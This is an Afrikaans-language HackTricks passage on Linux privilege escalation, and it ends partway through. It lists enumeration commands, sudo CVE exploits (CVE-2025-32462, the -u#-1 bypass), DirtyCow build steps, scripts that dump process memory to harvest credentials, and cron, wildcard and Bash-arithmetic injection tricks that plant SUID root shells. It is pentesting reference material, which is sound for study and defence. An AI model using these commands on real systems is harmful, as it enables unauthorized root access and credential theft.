# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Vir breër agtergrond en historiese enumeration-werkvloeie, vergelyk die g0tmi1k-, Payatu-, SANS-, LPE Workshop-, Linux-Privilege-Escalation- en linux-private-i-hulpbronne wat in die verwysings gelys word.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Stelselinligting

### OS-inligting

Kom ons begin om meer te wete te kom oor die OS wat loop.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

As jy **skryftoestemmings het op enige gids binne die `PATH`-veranderlike**, kan jy moontlik sommige biblioteke of binêre lêers kaap:

```bash
echo $PATH
```

### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Gaan die kernel-weergawe na en kyk of daar ’n exploit is wat gebruik kan word om voorregte te eskaleer.

Die [Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) versamel plaaslike eskalasiegevalle en skakels na die meer diepgaande Linux-kernelbesprekings in Binary Exploitation. Verifieer die betrokke build en konfigurasie voordat jy ’n gevallestudie toets.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Jy kan ’n goeie lys van kwesbare kernels en ’n paar reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Ander webwerwe waar jy ’n paar **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes van daardie webwerf te onttrek, kan jy die volgende doen:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Gereedskap wat kan help om na kernel-exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer IN die slagoffer uit, kontroleer slegs exploits vir kernel 2.x)

**Soek altyd die kernel-weergawe op Google**, dalk word jou kernel-weergawe in ’n kernel-exploit vermeld en dan sal jy seker wees dat dié exploit geldig is.

Bykomende kernel-exploitation-tegnieke:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux-privilege-escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat in voorkom:

```bash
searchsploit sudo
```

Jy kan met hierdie grep nagaan of die sudo-weergawe kwesbaar is.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 tot 1.9.17** laat onbevoorregte plaaslike gebruikers toe om via die `--chroot`-opsie na root te eskaleer wanneer sudo `/etc/nsswitch.conf` vanaf ’n gebruikerbeheerde gids laai; upstream het dit in **1.9.17p1** reggestel. Gaan elke uitvoerbare root-setuid sudo-binêr in die relevante paaie na, aangesien `sudo -V` slegs die binêr rapporteer wat deur `PATH` gekies is. Verspreidingspakkette kan die regstelling terugporteer sonder om die upstream-weergawestring te verander, dus moet die status van die verskaffer se pakket ook nagegaan word. Sien die [sudo-instandhouer se sekuriteitsadvies](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hier is ’n [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) om daardie [kwesbaarheid](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) uit te buit. Voordat jy die exploit uitvoer, maak seker dat jou `sudo`-weergawe kwesbaar is en die `chroot`-funksie ondersteun.

Vir meer inligting, verwys na die oorspronklike [kwesbaarheid-sekuriteitsadvies](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo-reëls se gasheergebaseerde omseiling (CVE-2025-32462)

Upstream sudo **1.8.8 tot 1.9.17** kan gasheergebaseerde sudoers-reëls evalueer met die **gasheernaam wat die gebruiker verskaf** via `sudo -h <host>` in plaas van die **werklike gasheernaam**; upstream het dit in **1.9.17p1** reggestel. Die gebruiker moet steeds ’n ooreenstemmende sudoers-inskrywing op die gekose gasheer hê. Gaan verskaffer-terugportering en alternatiewe sudo-binêre ook na, asook die plaaslike beleid. Sien die [sudo-instandhouer se sekuriteitsadvies](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Vereistes:
- Kwesbare sudo-weergawe
- Gasheerspesifieke sudoers-reëls (gasheer is nie die huidige gasheernaam of `ALL` nie)

Voorbeeld van ’n sudoers-patroon:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit deur die toegelate host te spoof:

```bash
sudo -h devbox id
sudo -h devbox -i
```

As die resolusie van die gekose naam geblokkeer word, verifieer hoe daardie naam op die gasheer opgelos word. Om ’n naam bloot in ’n log of konfigurasielêer te sien, beteken nie dat dit opgelos kan word nie, en die verandering van `/etc/hosts` vereis normaalweg bevoorregte skryftoegang.

#### sudo < v1.8.28

Hierdie [upstream Runas UID-bypass](https://ubuntu.com/security/CVE-2019-14287) vereis ’n effektiewe sudo-reël wat ’n opdrag as `ALL`-gebruikers toelaat, maar root uitsluit, soos `(ALL, !root) /bin/bash`. Die oproeper moet ook toegelaat word om daardie reël te gebruik, insluitend enige verifikasievereiste. Gaan die geïnstalleerde pakket se sekuriteitsadvies na: verskaffers het die regstelling na weergawes teruggeporteer waarvan die vertoonde upstream-weergawe steeds laer as 1.8.28 is. ’n `!root`-reël of ’n ou weergawe alleen bevestig nie dat die stelsel kwesbaar is nie. Moenie ’n bevoorregte opdrag tydens passiewe enumerasie toets nie.

```
sudo -u#-1 /bin/bash
```

### Dmesg-handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir ’n **voorbeeld** van hoe hierdie vuln uitgebuit kan word.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Meer stelsel-enumeration

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Lys moontlike verdedigings

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

As jy binne 'n container is, begin met die volgende container-security-afdeling en beweeg dan oor na die misbruikbladsye wat spesifiek vir die runtime is:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Skywe

Kyk **wat gemonteer en ontkoppel is**, waar en waarom. As iets ontkoppel is, kan jy probeer om dit te monteer en na private inligting te soek.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Nuttige sagteware

Lys nuttige binaries

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Kyk ook of **enige samesteller geïnstalleer is**. Dit is nuttig as jy ’n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit te compileer op die masjien waarop jy dit gaan gebruik (of op ’n soortgelyke masjien).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Kwesbare sagteware geïnstalleer

Gaan die **weergawes van die geïnstalleerde pakkette en dienste** na. Daar is dalk ’n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te verhoog…\
Dit word aanbeveel om die weergawes van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat op die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie opdragte baie inligting sal wys waarvan die meeste nutteloos sal wees. Daarom word dit aanbeveel om toepassings soos OpenVAS of soortgelyke toepassings te gebruik om te kyk of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits._

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kyk of enige proses **meer voorregte het as wat dit behoort te hê** (miskien word tomcat deur root uitgevoer?).

```bash
ps aux
ps -ef
top -n 1
```

Kontroleer altyd of [**electron/cef/chromium debuggers** loop; jy kan dit misbruik om voorregte te eskaleer](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** bespeur dit deur die `--inspect`-parameter in die proses se opdragreël na te gaan.\
**Kontroleer ook jou voorregte op die proses se binêre lêers**; dalk kan jy iemand s’n oorskryf.

### Ouer-kind-kettings tussen gebruikers

’n Kinderproses wat onder ’n **ander gebruiker** as sy ouerproses loop, is nie outomaties kwaadwillig nie, maar is ’n nuttige **triage-sein**. Sommige oorgange is verwag (`root` wat ’n diensgebruiker begin, aanmeldbestuurders wat sessieprosesse skep), maar ongewone kettings kan wrappers, debug-hulpprogramme, volharding of swak vertrouensgrense tydens looptyd blootlê.

Vinnige hersiening:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

As jy ’n verrassende ketting vind, ondersoek die ouer se commandoreël en alle lêers wat die gedrag daarvan beïnvloed (`config`, `EnvironmentFile`, helperskrifte, werkgids, skryfbare argumente). In verskeie werklike privesc-roetes was die kindproses self nie skryfbaar nie, maar die **ouerbeheerde config** of helperketting wel.

### Uitgevee uitvoerbare lêers en lêers wat uitgevee is terwyl hulle oop was

Looptyd-artefakte is dikwels steeds toeganklik **ná uitvee**. Dit is nuttig vir beide privilege escalation en die herwinning van bewyse van ’n proses wat reeds sensitiewe lêers oop het.

Kyk vir uitgevee uitvoerbare lêers:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

As `/proc/<PID>/exe` na `(deleted)` wys, loop die proses steeds die ou binêre beeld vanuit geheue. Dit is ’n sterk aanduiding dat jy ondersoek moet instel, omdat:

- die verwyderde uitvoerbare lêer interessante stringe of geloofsbriewe kan bevat
- die lopende proses steeds nuttige lêerbeskrywers kan blootstel
- ’n verwyderde bevoorregte binêre lêer op onlangse peuterwerk of ’n poging tot opruiming kan dui

Versamel verwyderde, oop lêers wêreldwyd:

```bash
lsof +L1
```

As jy ’n interessante descriptor vind, haal dit direk op:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Dit is veral waardevol wanneer ’n proses steeds ’n geskrapte geheim, script, databasisuitvoer of flag-lêer oop het.

### Prosesmonitering

Jy kan nutsmiddels soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer daar aan ’n stel vereistes voldoen word.

#### Linux ProcMon met sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) kan geselekteerde prosesse en stelseloproepe naspoor en ’n SQLite-nasporing stoor. As `sudo -l` ’n onbeperkte `procmon`-opdrag met root-vermoëns toelaat, oorweeg of dit ’n ander gebruiker se prosesinvoer of -afvoer kan waarneem. Hierdie toestemming is slegs ’n leidraad vir verdere ondersoek: ondersteuning vir tracing, die effektiewe beleid en die aktiwiteit van ’n geskikte proses is alles van belang. Nasporingslêers kan geheime bevat, dus moet jy gemagtigde uitvoere versigtig ondersoek en vermy om onverwante prosesse te versamel.

### Prosesgeheue

Sommige dienste op ’n bediener stoor **credentials in gewone teks in die geheue**.\
Normaalweg het jy **root-voorregte** nodig om die geheue te lees van prosesse wat aan ander gebruikers behoort; daarom is dit gewoonlik nuttiger wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **jy as ’n gewone gebruiker die geheue van prosesse wat jy besit, kan lees**.

> [!WARNING]
> Let daarop dat die meeste masjiene deesdae **ptrace nie by verstek toelaat nie**, wat beteken dat jy nie ander prosesse kan dump wat aan jou onbevoorregte gebruiker behoort nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, mits hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs ’n ouerproses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE-vermoë vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace nagespoor word nie. Sodra dit gestel is, is ’n herlaai nodig om ptracing weer te aktiveer.

’n Proses met dieselfde UID wat ’n wagwoordkluis kortliks ontsluit, kan ’n afsonderlike credential-grens vorm. Wanneer tracing toegelaat word, kan ’n aktiewe, dumpable proses die kluiswagwoord via sy invoer-syscalls of geheue blootlê, selfs al bly die geënkripteerde kluislêer self beskerm. `ptrace_scope=0` is slegs een voorvereiste: ooreenstemmende credentials, die teiken se dumpability, ander Linux-sekuriteitsmodules en die proses se leeftyd is ook van belang. Om vas te stel of ’n kluisinskrywing vir ’n Unix root-aanmelding gebruik kan word, vereis ’n afsonderlike credential-hergebruiktoets. Roetine-enumeration behoort die beleid en kandidaatproses- of kluispaaie aan te dui, nie invoer vas te lê of geheime uit te druk nie. Sien die [kernel se Yama-dokumentasie](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) en [ptrace-toegangstoetse](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

As jy toegang het tot die geheue van ’n FTP-diens (byvoorbeeld), kan jy die Heap kry en daarin na sy credentials soek.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB-skrip

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Vir ’n gegewe proses-ID wys **maps hoe geheue binne daardie proses se** virtuele adresruimte gekarteer is; dit wys ook die **toestemmings van elke gekarteerde streek**. Die **mem**-pseudo-lêer **stel die proses se geheue self bloot**. Uit die **maps**-lêer weet ons watter **geheuestreke leesbaar is** en wat hul offsets is. Ons gebruik hierdie inligting om in die mem-lêer te seek en alle leesbare streke na ’n lêer uit te stort.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kern se virtuele adresruimte kan met /dev/kmem verkry word.\
Tipies kan slegs **root** en die **kmem**-groep `/dev/mem` lees.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump vir linux

ProcDump is ’n Linux-herinterpretasie van die klassieke ProcDump-nutsding uit die Sysinternals-suite nutsgoed vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Gereedskap

Om ’n proses se geheue te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan die root-vereistes handmatig verwyder en die proses dump wat aan jou behoort
- Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Geloofsbriewe uit prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die authenticator-proses loop:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Jy kan die proses dump (sien vorige afdelings vir verskillende maniere om die geheue van ’n proses te dump) en in die geheue na aanmeldbesonderhede soek:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **aanmeldbewyse in gewone teks uit geheue** en uit sommige **bekende lêers steel**. Dit benodig root-regte om behoorlik te werk.

| Eienskap                                         | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM-wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktiewe FTP-verbindings)                  | vsftpd               |
| Apache2 (aktiewe HTTP Basic Auth-sessies)         | apache2              |
| OpenSSH (aktiewe SSH-sessies – sudo-gebruik)      | sshd:                |

#### Soekregexe/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Geskeduleerde/Cron-take

### Crontab UI (alseambusher) wat as root loop – webgebaseerde skeduleerder-privesc

As ’n web-“Crontab UI”-paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gebind is, kan jy dit steeds via SSH plaaslike poortaanstuur bereik en ’n bevoorregte taak skep om te eskaleer.<sup>[[1]](#references)[[4]](#references)</sup>

Tipiese ketting
- Ontdek ’n poort wat net aan loopback beskikbaar is (bv. 127.0.0.1:8000) en die Basic-Auth-realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind geloofsbriewe in operasionele artefakte:
  - Rugsteunlêers/skrifte met `zip -P <password>`
  - systemd-eenheid wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` openbaar
- Skep ’n tonnel en meld aan:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep ’n hoogbevoorregte taak en voer dit onmiddellik uit (skep ’n SUID-shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```

Verharding
- Moenie Crontab UI as root laat loop nie; beperk dit met ’n toegewyde gebruiker en minimale toestemmings
- Bind aan localhost en beperk toegang verder via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy die inbedding van geheime in unit-lêers; gebruik secret stores of ’n root-only EnvironmentFile
- Aktiveer ouditering/registrasie vir uitvoering van take op aanvraag

Kyk of enige geskeduleerde taak kwesbaar is. Miskien kan jy ’n script wat as root uitgevoer word, uitbuit (wildcard vuln? Kan jy lêers wysig wat root gebruik? Symlinks gebruik? Spesifieke lêers skep in die gids wat root gebruik?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

As `run-parts` gebruik word, kontroleer watter name werklik uitgevoer sal word:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Dit voorkom vals positiewe. ’n Skryfbare periodieke gids is net nuttig as jou payload-lêernaam ooreenstem met die plaaslike `run-parts`-reëls.

### Cron path

Byvoorbeeld, in _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op dat die gebruiker "user" skryfregte oor /home/user het_)

As die root-gebruiker in hierdie crontab probeer om ’n opdrag of skrip uit te voer sonder om die pad in te stel, byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy ’n root shell kry deur die volgende te gebruik:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” binne 'n opdrag bevat, kan jy dit uitbuit om onverwagte dinge (soos privesc) te doen. Voorbeeld:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**As die wildcard deur ’n pad voorafgegaan word, soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildcard-uitbuitingstruuks:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash-rekenkundige uitbreidingsinspuiting in cron-logontleders

Bash-rekenkunde kan onbetroubare teks as ’n uitdrukking interpreteer. In geraakte Bash-kontekste kan ’n skikkingsindeks binne daardie uitdrukking ’n bevelvervanging uitvoer. As ’n bevoorregte cron-ontleder aanvallerbeheerde logteks in so ’n rekenkundige vergelyking plaas, kan die bevelvervanging met die ontleder se identiteit loop.<sup>[[22]](#references)</sup> Dit hang af van die presiese Bash-uitdrukking en weergawe; ’n blote `$(...)0`-string in ’n uitgebreide veranderlike is op sigself nie ’n betroubare demonstrasie van herevaluering nie.

Die invoer kan ook uit lêermetadata of ’n ander veld kom wat van ’n gebruiker-skryfbare ligging gelees word. Byvoorbeeld, ’n bevoorregte skoonmaakscripting wat ’n beeld se `Producer`-merker lees en dit met `[[ "$producer" -eq "expected" ]]` vergelyk, voer ’n rekenkundige vergelyking uit, al is die veranderlike tussen aanhalingstekens. Volg die geskeduleerde identiteit, watter lêers die merker kan verskaf, enige transformasies voor die vergelyking, en die presiese Bash-gedrag. Gebruik ’n stringvergelyking vir teksmerkers; vir getalle, valideer die invoer as desimale syfers voordat jy rekenkunde uitvoer. Sien die [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Tipiese kwesbare patroon:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Veilige plaaslike gedragstoets vir die array-subscript-meganisme (geen bevoorregte proses of lêerverandering nie):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Traceer die werklike geskeduleerde script en die letterlike invoerpad wat dit oopmaak. Selfs wanneer die loglêer self nie skryfbaar is nie, kan ’n gebruiker wat na die nie-sticky ouergids kan skryf en daardeur kan navigeer, moontlik die gidsinskrywing daarvan vervang; `namei -l` help om daardie toestemmings te onderskei. ’n Ander skryfbare logpad, ’n onleesbare skeduleerder of ’n parser wat daardie veld nooit as Bash-rekenkundige uitdrukking evalueer nie, bewys nie dat hierdie pad werk nie.

### Cron-skrip-oorwriting en symlink

As jy **’n cron-skrip kan wysig** wat deur root uitgevoer word, kan jy baie maklik ’n shell kry:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

As die script wat deur root uitgevoer word ’n **gids gebruik waartoe jy volle toegang het**, kan dit dalk nuttig wees om daardie gids te verwyder en ’n **symlink-gids na ’n ander gids te skep** wat ’n script bevat wat jy beheer.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink-validering en veiliger lêerhantering

Wanneer bevoorregte scripts/binaries nagegaan word wat lêers volgens pad lees of skryf, verifieer hoe skakels hanteer word:

- `stat()` volg ’n symlink en gee metadata van die teiken terug.
- `lstat()` gee metadata van die skakel self terug.
- `readlink -f` en `namei -l` help om die finale teiken op te spoor en wys die toestemmings van elke padkomponent.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Vir verdedigers/ontwikkelaars sluit veiliger patrone teen symlink-truuks die volgende in:

- `O_EXCL` met `O_CREAT`: misluk as die pad reeds bestaan (blokkeer skakels/lêers wat die aanvaller vooraf geskep het).
- `openat()`: werk relatief tot 'n vertroude directory file descriptor.
- `mkstemp()`: skep tydelike lêers atomies met veilige toestemmings.

### Pasgemaakte, ondertekende cron-binaries met skryfbare payloads
'n Gewone gebruiker wat die presiese binary kan skryf wat 'n root cron-job uitvoer, kan 'n privilege boundary oorsteek, maar 'n pasgemaakte handtekeningkontrole kan 'n ongetekende vervanging verwerp. In die gedokumenteerde geval was die root-besitte ELF in modus `0760`, wat 'n lid van sy groep toegelaat het om dit te skryf terwyl die root-eienaar dit kon uitvoer. 'n Sigbare prosesnasporing het gewys dat `objcopy` `.text_sig` onttrek het voordat die job die binary uitgevoer het; die volledige verifieerderskrip was nie leesbaar nie.<sup>[[2]](#references)</sup>

Die vervanging wat geslaag het, is met uitgelekte private ondertekeningsmateriaal en 'n ELF-ondertekenaar onderteken. Sy [formaatdokumentasie](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) beskryf 'n handtekeningafdeling wat van die uitvoerbare lêer se `.text` afgelei word. Daar word nie aangetoon dat die blote byvoeging van 'n sertifikaat of 'n ooreenstemmende string by `.text_sig` aan die onbekende verifieerder se vereistes voldoen nie. Kontroleer die werklik geskeduleerde pad, effektiewe skryftoegang, root-aanroeping en verifieerderbeleid voordat jy aflei dat 'n skryfbare, ondertekende binary uitbuitbaar is. 'n `.text_sig`-afdeling op sigself is slegs 'n leidraad vir hersiening.

### Gereelde cron-jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit uitbuit om voorregte te eskaleer.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **volgens die minste uitgevoerde opdragte te sorteer** en die opdragte wat die meeste uitgevoer is, te verwyder, kan jy die volgende doen:

```bash
